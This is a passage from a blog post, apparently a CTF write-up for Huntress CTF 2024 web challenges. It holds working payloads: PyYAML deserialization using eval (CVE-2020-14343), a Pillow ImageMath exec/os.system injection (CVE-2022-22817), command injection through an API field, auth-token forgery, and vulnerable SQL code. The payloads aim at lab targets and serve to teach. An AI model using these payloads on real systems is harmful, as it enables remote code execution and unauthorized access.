@@ -1,0 +1,1008 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>Huntress CTF 2024 - writeups - xeunwa</title><meta name="Description" content="PyYAML, ZipSlip, SQLi to pickleRCE, Timing Attack"><meta property="og:url" content="https://xeunwa.github.io/huntress-ctf-2024/">
+  <meta property="og:site_name" content="xeunwa">
+  <meta property="og:title" content="Huntress CTF 2024 - writeups">
+  <meta property="og:description" content="PyYAML, ZipSlip, SQLi to pickleRCE, Timing Attack">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-11-03T01:00:00+08:00">
+    <meta property="article:modified_time" content="2024-11-03T01:00:00+08:00">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="CVE-2020-14343">
+    <meta property="article:tag" content="CVE-2022-22817">
+    <meta property="article:tag" content="Insecure-Deserialization">
+    <meta property="article:tag" content="Command Injection">
+    <meta property="article:tag" content="Code Review">
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/72879902?v=4">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://avatars.githubusercontent.com/u/72879902?v=4">
+  <meta name="twitter:title" content="Huntress CTF 2024 - writeups">
+  <meta name="twitter:description" content="PyYAML, ZipSlip, SQLi to pickleRCE, Timing Attack">
+<meta name="application-name" content="DoIt">
+<meta name="apple-mobile-web-app-title" content="DoIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://xeunwa.github.io/huntress-ctf-2024/" /><link rel="prev" href="https://xeunwa.github.io/nahamcon-ctf-2024/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Huntress CTF 2024 - writeups",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/xeunwa.github.io\/huntress-ctf-2024\/"
+        },"image": ["https:\/\/xeunwa.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "Python, CVE-2020-14343, CVE-2022-22817, Insecure-Deserialization, Command-Injection, Code-Review, SQLi, Filter-Bypass, File-Upload, Timing-Attack","wordcount":  2003 ,
+        "url": "https:\/\/xeunwa.github.io\/huntress-ctf-2024\/","datePublished": "2024-11-03T01:00:00+08:00","dateModified": "2024-11-03T01:00:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/avatars.githubusercontent.com\/u\/72879902?v=4"},"authors": [{
+                        "@type": "Person",
+                        "name": "xeunwa"                    
+                    }],"description": "PyYAML, ZipSlip, SQLi to pickleRCE, Timing Attack"
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('black' === 'light' || 'black' === 'dark' || 'black' === 'black') setTheme('black'), saveTheme('black'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="xeunwa"><img
+        class="logo"
+        loading="lazy"
+        src="https://avatars.githubusercontent.com/u/72879902?v=4"
+        srcset="https://avatars.githubusercontent.com/u/72879902?v=4, https://avatars.githubusercontent.com/u/72879902?v=4 1.5x, https://avatars.githubusercontent.com/u/72879902?v=4 2x"
+        sizes="auto"
+        alt="https://avatars.githubusercontent.com/u/72879902?v=4"
+        title="https://avatars.githubusercontent.com/u/72879902?v=4" ><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/categories/ctf/"> Writeups </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/whoami/"> whoami </a><a class="menu-item" href="https://github.com/xeunwa" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="xeunwa"><img
+        class="logo"
+        loading="lazy"
+        src="https://avatars.githubusercontent.com/u/72879902?v=4"
+        srcset="https://avatars.githubusercontent.com/u/72879902?v=4, https://avatars.githubusercontent.com/u/72879902?v=4 1.5x, https://avatars.githubusercontent.com/u/72879902?v=4 2x"
+        sizes="auto"
+        alt="https://avatars.githubusercontent.com/u/72879902?v=4"
+        title="https://avatars.githubusercontent.com/u/72879902?v=4" ><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/categories/ctf/" title="">Writeups</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/whoami/" title="">whoami</a><a class="menu-item" href="https://github.com/xeunwa" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content always-active" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#y2j-50-pts">Y2J (50 pts)</a></li>
+        <li><a href="#plantopia-131-pts">Plantopia (131 pts)</a></li>
+        <li><a href="#helpfuldesk-231-pts">HelpfulDesk (231 pts)</a></li>
+        <li><a href="#pillowfight-338pts">PillowFight (338pts)</a></li>
+        <li><a href="#moveable-376-pts">MOVEable (376 pts)</a>
+          <ul>
+            <li><a href="#adding-a-valid-session-to-the-db">Adding a valid session to the DB</a></li>
+            <li><a href="#exploiting-using-pickle-rce">Exploiting using Pickle RCE</a></li>
+          </ul>
+        </li>
+        <li><a href="#zippy-392-pts">Zippy (392 pts)</a></li>
+      </ul>
+    </li>
+    <li><a href="#scripting">Scripting</a>
+      <ul>
+        <li><a href="#base64by32-50-pts">base64by32 (50 pts)</a></li>
+        <li><a href="#echo-chamber-50-pts">Echo Chamber (50 pts)</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#time-will-tell-241-pts">Time will tell (241 pts)</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Huntress CTF 2024 - writeups</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class='author'><span class="author fas fa-user-circle fa-fw"></span><span class='screen-reader-text'>  </span><a href='https://xeunwa.github.io/authors/xeunwa'>xeunwa</a></span>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>Web</a>&nbsp;<a href="/categories/scripting/"><i class="far fa-folder fa-fw"></i>Scripting</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-11-03">2024-11-03</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-11-03">2024-11-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2003 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;10 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#y2j-50-pts">Y2J (50 pts)</a></li>
+        <li><a href="#plantopia-131-pts">Plantopia (131 pts)</a></li>
+        <li><a href="#helpfuldesk-231-pts">HelpfulDesk (231 pts)</a></li>
+        <li><a href="#pillowfight-338pts">PillowFight (338pts)</a></li>
+        <li><a href="#moveable-376-pts">MOVEable (376 pts)</a>
+          <ul>
+            <li><a href="#adding-a-valid-session-to-the-db">Adding a valid session to the DB</a></li>
+            <li><a href="#exploiting-using-pickle-rce">Exploiting using Pickle RCE</a></li>
+          </ul>
+        </li>
+        <li><a href="#zippy-392-pts">Zippy (392 pts)</a></li>
+      </ul>
+    </li>
+    <li><a href="#scripting">Scripting</a>
+      <ul>
+        <li><a href="#base64by32-50-pts">base64by32 (50 pts)</a></li>
+        <li><a href="#echo-chamber-50-pts">Echo Chamber (50 pts)</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#time-will-tell-241-pts">Time will tell (241 pts)</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><figure><a class="lightgallery" href="/huntress-ctf-2024/image.png" title="alt text" data-thumbnail="/huntress-ctf-2024/image.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/image.png"
+            srcset="/huntress-ctf-2024/image.png, /huntress-ctf-2024/image.png 1.5x, /huntress-ctf-2024/image.png 2x"
+            sizes="auto"
+            alt="alt text" height="741"  width="1320" >
+    </a></figure>
+Writeups for all <strong>web(6/6)</strong> and <strong>scripting(2/2)</strong> challenges. + <strong>misc/time-will-tell</strong></p>
+<p><strong>team</strong>: joyuriz <strong>points</strong>: 3105 <strong>rank</strong>: 257/3444</p>
+<hr>
+<h1 id="web" class="headerLink">
+    <a href="#web" class="header-mark"></a>Web</h1><h2 id="y2j-50-pts" class="headerLink">
+    <a href="#y2j-50-pts" class="header-mark"></a>Y2J (50 pts)</h2><p>A web application where we can convert Yaml to JSON. I learned the server uses python and by checking headers and looked for vulnerabilities regarding Yaml especially in Python YAML.</p>
+<blockquote>
+<p>Searched and found <strong>CVE-2020-14343</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-14343" target="_blank" rel="noopener noreferrer">https://nvd.nist.gov/vuln/detail/CVE-2020-14343</a> that allowed code execution in PyYAML library.</p>
+</blockquote>
+<p>This writeup <a href="https://hackmd.io/@harrier/uiuctf20" target="_blank" rel="noopener noreferrer">https://hackmd.io/@harrier/uiuctf20</a> explains and builds upon the payload. I used this payload to get the flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="cp">!!python/object/new:tuple</span><span class="w"> </span><span class="p">[</span><span class="cp">!!python/object/new:map</span><span class="w"> </span><span class="p">[</span><span class="cp">!!python/name:eval</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&#34;</span><span class="w"> </span><span class="p">]]]</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/huntress-ctf-2024/y2j-flag.png" title="alt text" data-thumbnail="/huntress-ctf-2024/y2j-flag.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/y2j-flag.png"
+            srcset="/huntress-ctf-2024/y2j-flag.png, /huntress-ctf-2024/y2j-flag.png 1.5x, /huntress-ctf-2024/y2j-flag.png 2x"
+            sizes="auto"
+            alt="alt text" height="810"  width="1301" >
+    </a></figure></p>
+<h2 id="plantopia-131-pts" class="headerLink">
+    <a href="#plantopia-131-pts" class="header-mark"></a>Plantopia (131 pts)</h2><p>We given a web application with credentials to the login page. Logging in we can observe that <code>session</code> and <code>auth</code> cookies are set as well as other cookies.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Cookie: session=eyJfZnJlc2giOmZhbHNlfQ.ZyaENQ.GHM7nJw9Sk3doUEeOrRuWj4JibI; auth=dGVzdHVzZXIuMC4xNzMwNTgzODIw
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can also see there is API documentation but some looks like its for admin.</p>
+<p><figure><a class="lightgallery" href="/huntress-ctf-2024/plantopiaa.png" title="alt text" data-thumbnail="/huntress-ctf-2024/plantopiaa.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/plantopiaa.png"
+            srcset="/huntress-ctf-2024/plantopiaa.png, /huntress-ctf-2024/plantopiaa.png 1.5x, /huntress-ctf-2024/plantopiaa.png 2x"
+            sizes="auto"
+            alt="alt text" height="574"  width="1885" >
+    </a></figure></p>
+<p>Accessing these endpoints require us to use an <code>Authorization</code> header using the <code>auth</code> cookie set during our login. We can set <code>Authorization: dGVzdHVzZXIuMC4xNzMwNTgzODIw</code> to access the API. which is just base64 encoded from <code>testuser.0.1730583820</code></p>
+<p>Since most of these functionality require admin privileges. I played around and just changed the value from <code>testuser</code> to <code>admin</code> and from <code>0</code> to <code>1</code>. and I successfully accessed the <code>/api/admin/logs</code></p>
+<p><figure><a class="lightgallery" href="/huntress-ctf-2024/api/logs.png" title="alt text" data-thumbnail="/huntress-ctf-2024/api/logs.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/api/logs.png"
+            srcset="/huntress-ctf-2024/api/logs.png, /huntress-ctf-2024/api/logs.png 1.5x, /huntress-ctf-2024/api/logs.png 2x"
+            sizes="auto"
+            alt="alt text" height="498"  width="1836" >
+    </a></figure></p>
+<p>From there its just playing around with the admin functionalities. We can see that we can change the commands in the <code>/api/plants/1/edit</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/api/plants/1/edit</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">challenge.ctf.games:32308</span>
+</span></span><span class="line"><span class="cl"><span class="n">Authorization</span><span class="o">:</span> <span class="l">YWRtaW4uMS4xNzMwNTgzODIw</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">139</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;description&#34;</span><span class="p">:</span> <span class="s2">&#34;A beautiful sunflower.&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;sunlight_level&#34;</span><span class="p">:</span> <span class="mi">80</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;watering_threshold&#34;</span><span class="p">:</span> <span class="mi">50</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;alert_command&#34;</span><span class="p">:</span> <span class="s2">&#34;cat flag.txt&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we can trigger it via <code>/api/admin/sendmail</code> then view the output in <code>/api/admin/logs</code></p>
+<p><figure><a class="lightgallery" href="/huntress-ctf-2024/plantopia-flag.png" title="alt text" data-thumbnail="/huntress-ctf-2024/plantopia-flag.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/plantopia-flag.png"
+            srcset="/huntress-ctf-2024/plantopia-flag.png, /huntress-ctf-2024/plantopia-flag.png 1.5x, /huntress-ctf-2024/plantopia-flag.png 2x"
+            sizes="auto"
+            alt="alt text" height="839"  width="1818" >
+    </a></figure></p>
+<h2 id="helpfuldesk-231-pts" class="headerLink">
+    <a href="#helpfuldesk-231-pts" class="header-mark"></a>HelpfulDesk (231 pts)</h2><p>Not going deep into this one. This is duplicate from NahamconCTF
+<a href="https://www.google.com/search?q=nahamconctf&#43;helpfuldesk&#43;writeup" target="_blank" rel="noopener noreferrer">https://www.google.com/search?q=nahamconctf+helpfuldesk+writeup</a></p>
+<p>There is a <code>/Setup/SetupWizard</code> path if you download and view the source code where you can change the admin credentials and from there we can get the flag.</p>
+<h2 id="pillowfight-338pts" class="headerLink">
+    <a href="#pillowfight-338pts" class="header-mark"></a>PillowFight (338pts)</h2><p>&ldquo;PillowFight uses advanced AI/MLRegressionLearning* to combine two images of your choosing&rdquo;</p>
+<p>Trying out the web application feature we can upload 2 images and combine into <code>/static/combined.png</code>. We can also see that this is <code>Powered by Python Pillow v8.4.0!</code> as seen from the footer.</p>
+<blockquote>
+<p>Searching around, I learned it might be vulnerable to
+<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22817" target="_blank" rel="noopener noreferrer">https://nvd.nist.gov/vuln/detail/CVE-2022-22817</a>
+&ldquo;PIL.ImageMath.eval in Pillow before 9.0.0 allows evaluation of arbitrary expressions, such as ones that use the Python exec method. A lambda expression could also be used.&rdquo;</p>
+</blockquote>
+<p>We can see that we can also add custom commands from the API documentation</p>
+<p><figure><a class="lightgallery" href="/huntress-ctf-2024/pillow-fight-api.png" title="alt text" data-thumbnail="/huntress-ctf-2024/pillow-fight-api.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/pillow-fight-api.png"
+            srcset="/huntress-ctf-2024/pillow-fight-api.png, /huntress-ctf-2024/pillow-fight-api.png 1.5x, /huntress-ctf-2024/pillow-fight-api.png 2x"
+            sizes="auto"
+            alt="alt text" height="1096"  width="1764" >
+    </a></figure></p>
+<p>This looks like we can pass our own <code>eval</code> command, so I tried working with python code injection payloads and ended up using a standard os command payload to get the flag and write to the <code>/static</code> directory.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">exec</span><span class="p">(</span><span class="s1">&#39;import os; os.system(&#34;cat flag.txt&gt; ./static/flag.txt&#34;)&#39;</span><span class="p">)</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/huntress-ctf-2024/pillow-flag.png" title="alt text" data-thumbnail="/huntress-ctf-2024/pillow-flag.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/pillow-flag.png"
+            srcset="/huntress-ctf-2024/pillow-flag.png, /huntress-ctf-2024/pillow-flag.png 1.5x, /huntress-ctf-2024/pillow-flag.png 2x"
+            sizes="auto"
+            alt="alt text" height="287"  width="1873" >
+    </a></figure></p>
+<h2 id="moveable-376-pts" class="headerLink">
+    <a href="#moveable-376-pts" class="header-mark"></a>MOVEable (376 pts)</h2><p>We can see in the web application a standard login form, no registration. Aside from that we have the source code.</p>
+<p>What I observed first in the source code is the <code>executeScript</code> under <code>/login</code> route.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login_user</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">DBClean</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">DBClean</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">conn</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sql</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;SELECT * FROM users WHERE username=&#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39; AND password=&#39;</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">executescript</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#...</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><code>executeScript</code> allows multiple statements<br>
+<a href="https://docs.python.org/3/library/sqlite3.html#sqlite3.Cursor.executescript" target="_blank" rel="noopener noreferrer">https://docs.python.org/3/library/sqlite3.html#sqlite3.Cursor.executescript</a>
+and will not be able to return any rows so the user will not be able to login regardless if there exists a valid user from the database.</p>
+</blockquote>
+<p>Under <code>/download/&lt;filename&gt;/&lt;sessionid&gt;</code> we can see that it just checks if the session exists from the database and we will be able to download the file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/download/&lt;filename&gt;/&lt;sessionid&gt;&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">download_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">sessionid</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">conn</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SELECT * FROM activesessions WHERE sessionid=?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">sessionid</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">active_session</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">active_session</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;No active session found&#39;</span><span class="p">)</span>
